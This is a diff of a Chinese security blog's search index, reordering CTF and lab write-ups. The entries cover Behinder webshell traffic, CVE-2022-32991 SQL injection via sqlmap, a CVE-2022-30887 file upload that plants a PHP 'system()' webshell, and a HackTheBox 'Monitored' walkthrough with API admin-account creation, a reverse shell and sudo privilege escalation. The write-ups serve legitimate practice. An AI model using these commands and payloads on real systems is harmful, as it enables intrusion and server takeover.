@@ -1,32 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>2024高校网络安全管理运维赛-easyshell</title>
-    <url>/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-easyshell.html</url>
-    <content><![CDATA[<p>冰蝎流量分析</p>
-<span id="more"></span>
-
-<p>打开附件，筛选一下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http &amp;&amp; ip.src==192.168.33.102</span><br></pre></td></tr></table></figure>
-
-<p>追踪tcp流，发现具有冰蝎流量的特征</p>
-<p><img src="/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-easyshell/image-20240506225011235.png"></p>
-<p>导出http对象，保存到本地</p>
-<p><img src="/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-easyshell/image-20240506225053452.png"></p>
-<p>将shell.php内容丢到<a href="http://tools.bugscaner.com/cryptoaes/">在线网站</a>解密，这里密钥就直接猜默认密钥</p>
-<p><img src="/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-easyshell/image-20240506224735752.png"></p>
-<p>在第十个shell.php进行解密后再base64两次发现是PK头</p>
-<p><img src="/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-easyshell/image-20240506225825504.png"></p>
-<p>保存为zip文件后爆破密码<code>A8s123/+*</code>，解压后得到flag</p>
-]]></content>
-      <categories>
-        <category>流量分析</category>
-      </categories>
-      <tags>
-        <tag>冰蝎</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>2018信息安全铁人三项数据赛</title>
     <url>/article/2018%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E6%95%B0%E6%8D%AE%E8%B5%9B.html</url>
     <content><![CDATA[<p>记录一些铁三的流量分析题</p>
@@ -123,6 +97,32 @@
       </categories>
       <tags>
         <tag>铁人三项</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2024高校网络安全管理运维赛-easyshell</title>
+    <url>/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-easyshell.html</url>
+    <content><![CDATA[<p>冰蝎流量分析</p>
+<span id="more"></span>
+
+<p>打开附件，筛选一下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http &amp;&amp; ip.src==192.168.33.102</span><br></pre></td></tr></table></figure>
+
+<p>追踪tcp流，发现具有冰蝎流量的特征</p>
+<p><img src="/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-easyshell/image-20240506225011235.png"></p>
+<p>导出http对象，保存到本地</p>
+<p><img src="/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-easyshell/image-20240506225053452.png"></p>
+<p>将shell.php内容丢到<a href="http://tools.bugscaner.com/cryptoaes/">在线网站</a>解密，这里密钥就直接猜默认密钥</p>
+<p><img src="/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-easyshell/image-20240506224735752.png"></p>
+<p>在第十个shell.php进行解密后再base64两次发现是PK头</p>
+<p><img src="/article/2024%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E8%BF%90%E7%BB%B4%E8%B5%9B-easyshell/image-20240506225825504.png"></p>
+<p>保存为zip文件后爆破密码<code>A8s123/+*</code>，解压后得到flag</p>
+]]></content>
+      <categories>
+        <category>流量分析</category>
+      </categories>
+      <tags>
+        <tag>冰蝎</tag>
       </tags>
   </entry>
   <entry>
@@ -347,6 +347,27 @@
       </categories>
   </entry>
   <entry>
+    <title>CVE-2022-32991</title>
+    <url>/article/CVE-2022-32991.html</url>
+    <content><![CDATA[<p>该CMS的welcome.php中存在SQL注入攻击</p>
+<span id="more"></span>
+
+<h2 id="CVE-2022-32991"><a href="#CVE-2022-32991" class="headerlink" title="CVE-2022-32991"></a>CVE-2022-32991</h2><p>随便注册一个用户登录</p>
+<p><img src="/article/CVE-2022-32991/image-20240125122119271.png"></p>
+<p>对各个页面的参数就行sqlmap扫描</p>
+<p>最终在Janobe Sourcecode测试出eid参数存在sql注入</p>
+<p><img src="/article/CVE-2022-32991/image-20240125122159745.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://eci-2ze9bpwkd9h3b5v3kfo5.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot; --cookie=&quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943=1706068419,1706092531,1706155955; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1706155955; PHPSESSID=ffu4h67f4fgtpmp0m9cn2gancs&quot; -D ctf -T flag -C flag --dump</span><br></pre></td></tr></table></figure>
+
+<p>得到flag</p>
+<p><img src="/article/CVE-2022-32991/image-20240125122248984.png"></p>
+]]></content>
+      <categories>
+        <category>春秋云镜</category>
+        <category>漏洞复现</category>
+      </categories>
+  </entry>
+  <entry>
     <title>CVE-2022-30887</title>
     <url>/article/CVE-2022-30887.html</url>
     <content><![CDATA[<p>多语言药房管理系统 (MPMS) 是用 PHP 和 MySQL 开发的，该CMS中php_action&#x2F;editProductImage.php存在任意文件上传漏洞</p>
@@ -362,27 +383,6 @@
 <p>发包即可</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /php_action/editProductImage.php?id=1 HTTP/1.1</span><br><span class="line">Host: eci-2zeio4u7nghklszal94j.cloudeci1.ichunqiu.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------190811817834681586072859788548</span><br><span class="line">Content-Length: 489</span><br><span class="line">Origin: http://eci-2zeio4u7nghklszal94j.cloudeci1.ichunqiu.com</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://eci-2zeio4u7nghklszal94j.cloudeci1.ichunqiu.com/editproduct.php?id=1</span><br><span class="line">Cookie: Hm_lvt_2d0601bd28de7d49818249cf35d95943=1712973768; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1712981784; googtrans=/en/zh-CN; PHPSESSID=fk5vtlalgr7ok0d8dce8l6emof; googtrans=/en/zh-CN</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">-----------------------------190811817834681586072859788548</span><br><span class="line">Content-Disposition: form-data; name=&quot;old_image&quot;</span><br><span class="line"></span><br><span class="line">tab.jpg</span><br><span class="line">-----------------------------190811817834681586072859788548</span><br><span class="line">Content-Disposition: form-data; name=&quot;productImage&quot;; filename=&quot;shell.php&quot;</span><br><span class="line">Content-Type: image/jpeg</span><br><span class="line"></span><br><span class="line">&lt;?php system($_POST[1]);?&gt;</span><br><span class="line">-----------------------------190811817834681586072859788548</span><br><span class="line">Content-Disposition: form-data; name=&quot;btn&quot;</span><br><span class="line"></span><br><span class="line">-----------------------------190811817834681586072859788548--</span><br></pre></td></tr></table></figure>
 
-]]></content>
-      <categories>
-        <category>春秋云镜</category>
-        <category>漏洞复现</category>
-      </categories>
-  </entry>
-  <entry>
-    <title>CVE-2022-32991</title>
-    <url>/article/CVE-2022-32991.html</url>
-    <content><![CDATA[<p>该CMS的welcome.php中存在SQL注入攻击</p>
-<span id="more"></span>
-
-<h2 id="CVE-2022-32991"><a href="#CVE-2022-32991" class="headerlink" title="CVE-2022-32991"></a>CVE-2022-32991</h2><p>随便注册一个用户登录</p>
-<p><img src="/article/CVE-2022-32991/image-20240125122119271.png"></p>
-<p>对各个页面的参数就行sqlmap扫描</p>
-<p>最终在Janobe Sourcecode测试出eid参数存在sql注入</p>
-<p><img src="/article/CVE-2022-32991/image-20240125122159745.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://eci-2ze9bpwkd9h3b5v3kfo5.cloudeci1.ichunqiu.com/welcome.php?q=quiz&amp;step=2&amp;eid=60377db362694&amp;n=1&amp;t=34&quot; --cookie=&quot;Hm_lvt_2d0601bd28de7d49818249cf35d95943=1706068419,1706092531,1706155955; Hm_lpvt_2d0601bd28de7d49818249cf35d95943=1706155955; PHPSESSID=ffu4h67f4fgtpmp0m9cn2gancs&quot; -D ctf -T flag -C flag --dump</span><br></pre></td></tr></table></figure>
-
-<p>得到flag</p>
-<p><img src="/article/CVE-2022-32991/image-20240125122248984.png"></p>
 ]]></content>
       <categories>
         <category>春秋云镜</category>
@@ -992,6 +992,114 @@
       </tags>
   </entry>
   <entry>
+    <title>Monitored-HackTheBox</title>
+    <url>/article/Monitored-HackTheBox.html</url>
+    <content><![CDATA[<p>snmp协议</p>
+<span id="more"></span>
+
+<h1 id="Monitored-HackTheBox"><a href="#Monitored-HackTheBox" class="headerlink" title="Monitored-HackTheBox"></a>Monitored-HackTheBox</h1><p><strong>信息搜集</strong></p>
+<p>nmap扫描一下端口</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -v --min-rate 1000 10.10.11.248</span><br></pre></td></tr></table></figure>
+
+<p>扫描结果如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT     STATE    SERVICE  VERSION</span><br><span class="line">22/tcp   open     ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)</span><br><span class="line">80/tcp   open     http     Apache httpd 2.4.56</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET</span><br><span class="line">|_http-title: Did not follow redirect to https://nagios.monitored.htb/</span><br><span class="line">|_http-server-header: Apache/2.4.56 (Debian)</span><br><span class="line">84/tcp   filtered ctf</span><br><span class="line">389/tcp  open     ldap     OpenLDAP 2.2.X - 2.3.X</span><br><span class="line">443/tcp  open     ssl/http Apache httpd 2.4.56 ((Debian))</span><br></pre></td></tr></table></figure>
+
+<p>注意到80端口跳转到<code>https://nagios.monitored.htb/</code>且无法访问，我们试试添加到<code>/etc/hosts</code>成功访问</p>
+<p>继续访问发现是登陆界面</p>
+<p><img src="/article/Monitored-HackTheBox/image-20240403182522547.png"></p>
+<p>然后就没有什么收获了，参考国外师傅wp是要进行 udp 扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -sV -sC -v -sU 10.10.11.248</span><br></pre></td></tr></table></figure>
+
+<p>扫描结果如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT    STATE         SERVICE  VERSION</span><br><span class="line">68/udp  open|filtered dhcpc</span><br><span class="line">123/udp open          ntp      NTP v4 (unsynchronized)</span><br><span class="line">161/udp open          snmp     SNMPv1 server; net-snmp SNMPv3 server (public)</span><br><span class="line">162/udp open|filtered snmptrap</span><br></pre></td></tr></table></figure>
+
+<p>注意到161端口为snmp协议，我们先简单了解下两个概念</p>
+<p><strong>SNMP</strong></p>
+<blockquote>
+<p>SNMP是一种标准的网络管理协议，它允许管理员监控和管理网络设备，例如路由器、交换机、服务器等。它有三个版本分别是<code>1，c2，3</code>，主要区别在于操作类型和安全性。</p>
+</blockquote>
+<p><strong>管理信息库MIB</strong></p>
+<blockquote>
+<p>任何一个被管理的资源都表示成一个对象，称为被管理的对象。MIB是被管理对象的集合。它定义了被管理对象的一系列属性：对象的名称、对象的访问权限和对象的数据类型等。</p>
+</blockquote>
+<p>MIB文件中的变量使用的名字取自ISO和ITU管理的对象标识符（object identifier）名字空间。它是一种分级树的结构。如下图所示，第一级有三个节点：ccitt、iso、iso-ccitt。低级的对象ID分别由相关组织分配。一个特定对象的标识符可通过由根到该对象的路径获得，一般网络设备取iso节点下的对象内容。</p>
+<p>如名字空间ip结点下一个名字为ipInReceives的MIB变量被指派数字值3，那么该变量名为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iso.org.dod.internet.mgmt.mib.ip.ipInReceives</span><br></pre></td></tr></table></figure>
+
+<p>相应的数字表示（对象标识符OID，唯一标识一个MIB对象）为<code>1.3.6.1.2.1.4.3</code></p>
+<p><img src="/article/Monitored-HackTheBox/image-20240403192944296.png"></p>
+<p>回到题目，用snmpwalk进行扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">snmpwalk -v 1 -c public 10.10.11.248 1.3.6.1.2.1.25</span><br></pre></td></tr></table></figure>
+
+<p>注：这里版本应该都能扫出来</p>
+<p>​		<code>public</code>为团体名，是一种简单的身份验证机制</p>
+<p>​		<code>1.3.6.1.2.1.25</code>为对象标识符OID(收集所有系统信息)</p>
+<p><img src="/article/Monitored-HackTheBox/image-20240403194127846.png"></p>
+<p>得到用户登录信息<code>svc:XjH7VCehowpR1xZB</code></p>
+<p><img src="/article/Monitored-HackTheBox/image-20240403193352038.png"></p>
+<p>不过登陆失败</p>
+<p><img src="/article/Monitored-HackTheBox/image-20240403194504872.png"></p>
+<p>我们扫一下目录发现路径<code>/nagios</code>，访问一下有登录框</p>
+<p><img src="/article/Monitored-HackTheBox/image-20240403200058890.png"></p>
+<p>成功登录</p>
+<p><img src="/article/Monitored-HackTheBox/image-20240403200301691.png"></p>
+<p>获得信息Nagios xi版本为4.4.13，找到相关漏洞</p>
+<p><img src="/article/Monitored-HackTheBox/image-20240403202017508.png"></p>
+<p>我们可以用sqlmap去注入数据库得到admin的api信息 <a href="https://medium.com/@n1ghtcr4wl3r/nagios-xi-vulnerability-cve-2023-40931-sql-injection-in-banner-ace8258c5567">参考文章</a></p>
+<p>当然在文章中我们注意到成功需要知道cookie值</p>
+<p><img src="/article/Monitored-HackTheBox/image-20240403202147750.png"></p>
+<p>我们通过对<code>/nagiosxi</code>不断深度扫描，最终得到下面路径</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://nagios.monitored.htb/nagiosxi/api/v1/authenticate</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Monitored-HackTheBox/image-20240403202956326.png"></p>
+<p>我们bp抓包修改下请求方式，提交参数为刚刚的用户和密码</p>
+<p>得到token值<code>a7eb754b64862d9a0943c405c4d4e2717eea9d51</code></p>
+<p><img src="/article/Monitored-HackTheBox/image-20240403203751456.png"></p>
+<p>因为这里的token值会变，所以在使用sqlmap的时候用curl命令去获得</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;https://nagios.monitored.htb//nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&amp;id=3&amp;token=`curl -ks https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -d &quot;username=svc&amp;password=XjH7VCehowpR1xZB&amp;valid_min=500&quot; | awk -F&#x27;&quot;&#x27; &#x27;&#123;print$12&#125;&#x27;`&quot; --level 5 --risk 3 -p id --batch --dbs</span><br></pre></td></tr></table></figure>
+
+<p>得到admin的api后，添加用户</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -k &quot;https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&amp;pretty=1&quot; -d &quot;username=rev1ve&amp;password=rev1ve&amp;name=rev1ve&amp;email=rev1ve@localhost&amp;auth_level=admin&quot;</span><br></pre></td></tr></table></figure>
+
+<p>我们成功用<code>rev1ve:rev1ve</code>登录</p>
+<p><img src="/article/Monitored-HackTheBox/image-20240403235458293.png"></p>
+<p>然后<code>Configure -&gt; Core Config Manager</code>找到Command，添加反弹shell命令</p>
+<p>然后在<code>Monitoring-&gt;Hosts-&gt;localhost</code>中Run一下调用shell</p>
+<p><img src="/article/Monitored-HackTheBox/image-20240404000803329.png"></p>
+<p>成功反弹shell</p>
+<p><img src="/article/Monitored-HackTheBox/image-20240404000838169.png"></p>
+<p>得到user的flag</p>
+<p><img src="/article/Monitored-HackTheBox/image-20240404000948674.png"></p>
+<p>尝试sudo提权</p>
+<p><img src="/article/Monitored-HackTheBox/image-20240404001440760.png"></p>
+<p>试试<code>manage_services.sh</code></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/local/nagiosxi/scripts/manage_services.sh</span><br></pre></td></tr></table></figure>
+
+<p>执行后提示需要有参数，随便加一个status</p>
+<p><img src="/article/Monitored-HackTheBox/image-20240404003341695.png"></p>
+<p><code>manage_services.sh</code>可以控制服务，注意到npcd文件可控，并且能够以root用户执行npcd服务的开启和关闭，因此可以在npcd服务中加入一段反弹shell来提权</p>
+<p>我们先停止npcd服务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/local/nagiosxi/scripts/manage_services.sh stop npcd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Monitored-HackTheBox/image-20240404003853008.png"></p>
+<p>使用wget命令下载我们的npcd文件，赋予权限</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x npcd</span><br></pre></td></tr></table></figure>
+
+<p><img src="/article/Monitored-HackTheBox/image-20240404002218837.png"></p>
+<p>然后开启<code>npcd</code>服务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/local/nagiosxi/scripts/manage_services.sh start npcd</span><br></pre></td></tr></table></figure>
+
+<p>成功提权拿到root的flag</p>
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>HackTheBox</tag>
+        <tag>提权</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>NCTF2023</title>
     <url>/article/NCTF2023.html</url>
     <content><![CDATA[<p>质量很高的比赛，收获满满</p>
@@ -1169,167 +1277,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Monitored-HackTheBox</title>
-    <url>/article/Monitored-HackTheBox.html</url>
-    <content><![CDATA[<p>snmp协议</p>
-<span id="more"></span>
-
-<h1 id="Monitored-HackTheBox"><a href="#Monitored-HackTheBox" class="headerlink" title="Monitored-HackTheBox"></a>Monitored-HackTheBox</h1><p><strong>信息搜集</strong></p>
-<p>nmap扫描一下端口</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sV -sC -v --min-rate 1000 10.10.11.248</span><br></pre></td></tr></table></figure>
-
-<p>扫描结果如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT     STATE    SERVICE  VERSION</span><br><span class="line">22/tcp   open     ssh      OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)</span><br><span class="line">80/tcp   open     http     Apache httpd 2.4.56</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET</span><br><span class="line">|_http-title: Did not follow redirect to https://nagios.monitored.htb/</span><br><span class="line">|_http-server-header: Apache/2.4.56 (Debian)</span><br><span class="line">84/tcp   filtered ctf</span><br><span class="line">389/tcp  open     ldap     OpenLDAP 2.2.X - 2.3.X</span><br><span class="line">443/tcp  open     ssl/http Apache httpd 2.4.56 ((Debian))</span><br></pre></td></tr></table></figure>
-
-<p>注意到80端口跳转到<code>https://nagios.monitored.htb/</code>且无法访问，我们试试添加到<code>/etc/hosts</code>成功访问</p>
-<p>继续访问发现是登陆界面</p>
-<p><img src="/article/Monitored-HackTheBox/image-20240403182522547.png"></p>
-<p>然后就没有什么收获了，参考国外师傅wp是要进行 udp 扫描</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -sV -sC -v -sU 10.10.11.248</span><br></pre></td></tr></table></figure>
-
-<p>扫描结果如下</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PORT    STATE         SERVICE  VERSION</span><br><span class="line">68/udp  open|filtered dhcpc</span><br><span class="line">123/udp open          ntp      NTP v4 (unsynchronized)</span><br><span class="line">161/udp open          snmp     SNMPv1 server; net-snmp SNMPv3 server (public)</span><br><span class="line">162/udp open|filtered snmptrap</span><br></pre></td></tr></table></figure>
-
-<p>注意到161端口为snmp协议，我们先简单了解下两个概念</p>
-<p><strong>SNMP</strong></p>
-<blockquote>
-<p>SNMP是一种标准的网络管理协议，它允许管理员监控和管理网络设备，例如路由器、交换机、服务器等。它有三个版本分别是<code>1，c2，3</code>，主要区别在于操作类型和安全性。</p>
-</blockquote>
-<p><strong>管理信息库MIB</strong></p>
-<blockquote>
-<p>任何一个被管理的资源都表示成一个对象，称为被管理的对象。MIB是被管理对象的集合。它定义了被管理对象的一系列属性：对象的名称、对象的访问权限和对象的数据类型等。</p>
-</blockquote>
-<p>MIB文件中的变量使用的名字取自ISO和ITU管理的对象标识符（object identifier）名字空间。它是一种分级树的结构。如下图所示，第一级有三个节点：ccitt、iso、iso-ccitt。低级的对象ID分别由相关组织分配。一个特定对象的标识符可通过由根到该对象的路径获得，一般网络设备取iso节点下的对象内容。</p>
-<p>如名字空间ip结点下一个名字为ipInReceives的MIB变量被指派数字值3，那么该变量名为</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iso.org.dod.internet.mgmt.mib.ip.ipInReceives</span><br></pre></td></tr></table></figure>
-
-<p>相应的数字表示（对象标识符OID，唯一标识一个MIB对象）为<code>1.3.6.1.2.1.4.3</code></p>
-<p><img src="/article/Monitored-HackTheBox/image-20240403192944296.png"></p>
-<p>回到题目，用snmpwalk进行扫描</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">snmpwalk -v 1 -c public 10.10.11.248 1.3.6.1.2.1.25</span><br></pre></td></tr></table></figure>
-
-<p>注：这里版本应该都能扫出来</p>
-<p>​		<code>public</code>为团体名，是一种简单的身份验证机制</p>
-<p>​		<code>1.3.6.1.2.1.25</code>为对象标识符OID(收集所有系统信息)</p>
-<p><img src="/article/Monitored-HackTheBox/image-20240403194127846.png"></p>
-<p>得到用户登录信息<code>svc:XjH7VCehowpR1xZB</code></p>
-<p><img src="/article/Monitored-HackTheBox/image-20240403193352038.png"></p>
-<p>不过登陆失败</p>
-<p><img src="/article/Monitored-HackTheBox/image-20240403194504872.png"></p>
-<p>我们扫一下目录发现路径<code>/nagios</code>，访问一下有登录框</p>
-<p><img src="/article/Monitored-HackTheBox/image-20240403200058890.png"></p>
-<p>成功登录</p>
-<p><img src="/article/Monitored-HackTheBox/image-20240403200301691.png"></p>
-<p>获得信息Nagios xi版本为4.4.13，找到相关漏洞</p>
-<p><img src="/article/Monitored-HackTheBox/image-20240403202017508.png"></p>
-<p>我们可以用sqlmap去注入数据库得到admin的api信息 <a href="https://medium.com/@n1ghtcr4wl3r/nagios-xi-vulnerability-cve-2023-40931-sql-injection-in-banner-ace8258c5567">参考文章</a></p>
-<p>当然在文章中我们注意到成功需要知道cookie值</p>
-<p><img src="/article/Monitored-HackTheBox/image-20240403202147750.png"></p>
-<p>我们通过对<code>/nagiosxi</code>不断深度扫描，最终得到下面路径</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://nagios.monitored.htb/nagiosxi/api/v1/authenticate</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/Monitored-HackTheBox/image-20240403202956326.png"></p>
-<p>我们bp抓包修改下请求方式，提交参数为刚刚的用户和密码</p>
-<p>得到token值<code>a7eb754b64862d9a0943c405c4d4e2717eea9d51</code></p>
-<p><img src="/article/Monitored-HackTheBox/image-20240403203751456.png"></p>
-<p>因为这里的token值会变，所以在使用sqlmap的时候用curl命令去获得</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;https://nagios.monitored.htb//nagiosxi/admin/banner_message-ajaxhelper.php?action=acknowledge_banner_message&amp;id=3&amp;token=`curl -ks https://nagios.monitored.htb/nagiosxi/api/v1/authenticate -d &quot;username=svc&amp;password=XjH7VCehowpR1xZB&amp;valid_min=500&quot; | awk -F&#x27;&quot;&#x27; &#x27;&#123;print$12&#125;&#x27;`&quot; --level 5 --risk 3 -p id --batch --dbs</span><br></pre></td></tr></table></figure>
-
-<p>得到admin的api后，添加用户</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">curl -k &quot;https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey=IudGPHd9pEKiee9MkJ7ggPD89q3YndctnPeRQOmS2PQ7QIrbJEomFVG6Eut9CHLL&amp;pretty=1&quot; -d &quot;username=rev1ve&amp;password=rev1ve&amp;name=rev1ve&amp;email=rev1ve@localhost&amp;auth_level=admin&quot;</span><br></pre></td></tr></table></figure>
-
-<p>我们成功用<code>rev1ve:rev1ve</code>登录</p>
-<p><img src="/article/Monitored-HackTheBox/image-20240403235458293.png"></p>
-<p>然后<code>Configure -&gt; Core Config Manager</code>找到Command，添加反弹shell命令</p>
-<p>然后在<code>Monitoring-&gt;Hosts-&gt;localhost</code>中Run一下调用shell</p>
-<p><img src="/article/Monitored-HackTheBox/image-20240404000803329.png"></p>
-<p>成功反弹shell</p>
-<p><img src="/article/Monitored-HackTheBox/image-20240404000838169.png"></p>
-<p>得到user的flag</p>
-<p><img src="/article/Monitored-HackTheBox/image-20240404000948674.png"></p>
-<p>尝试sudo提权</p>
-<p><img src="/article/Monitored-HackTheBox/image-20240404001440760.png"></p>
-<p>试试<code>manage_services.sh</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/local/nagiosxi/scripts/manage_services.sh</span><br></pre></td></tr></table></figure>
-
-<p>执行后提示需要有参数，随便加一个status</p>
-<p><img src="/article/Monitored-HackTheBox/image-20240404003341695.png"></p>
-<p><code>manage_services.sh</code>可以控制服务，注意到npcd文件可控，并且能够以root用户执行npcd服务的开启和关闭，因此可以在npcd服务中加入一段反弹shell来提权</p>
-<p>我们先停止npcd服务</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/local/nagiosxi/scripts/manage_services.sh stop npcd</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/Monitored-HackTheBox/image-20240404003853008.png"></p>
-<p>使用wget命令下载我们的npcd文件，赋予权限</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod +x npcd</span><br></pre></td></tr></table></figure>
-
-<p><img src="/article/Monitored-HackTheBox/image-20240404002218837.png"></p>
-<p>然后开启<code>npcd</code>服务</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo /usr/local/nagiosxi/scripts/manage_services.sh start npcd</span><br></pre></td></tr></table></figure>
-
-<p>成功提权拿到root的flag</p>
-]]></content>
-      <categories>
-        <category>渗透</category>
-      </categories>
-      <tags>
-        <tag>HackTheBox</tag>
-        <tag>提权</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>NSSRound#20 Basic</title>
-    <url>/article/NSSRound-20-Basic.html</url>
-    <content><![CDATA[<p>114514</p>
-<span id="more"></span>
-
-
-
-
-
-<h1 id="CSDN-To-PDF-V1-2"><a href="#CSDN-To-PDF-V1-2" class="headerlink" title="CSDN_To_PDF V1.2"></a>CSDN_To_PDF V1.2</h1><p>源码</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from flask import Flask, request, jsonify, make_response, render_template, flash, redirect, url_for</span><br><span class="line">import re</span><br><span class="line">from flask_weasyprint import HTML, render_pdf</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">URL_REGEX = re.compile(</span><br><span class="line">    r&#x27;http(s)?://&#x27;  # http or https</span><br><span class="line">    r&#x27;(?:[a-zA-Z]|[0-9]|[$-_@.&amp;+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+&#x27;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">def is_valid_url(url):</span><br><span class="line">    if not URL_REGEX.match(url):</span><br><span class="line">        return False</span><br><span class="line">    if &quot;blog.csdn.net&quot; not in url:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">    return True</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def CsdnToPdf():</span><br><span class="line">    if request.method == &#x27;POST&#x27;:</span><br><span class="line">        url = request.form.get(&#x27;url&#x27;)</span><br><span class="line">        # 当我不知道weasyprint会解析恶意 &lt;link attachment=xxx&gt;？</span><br><span class="line">        url = url.replace(&quot;html&quot;, 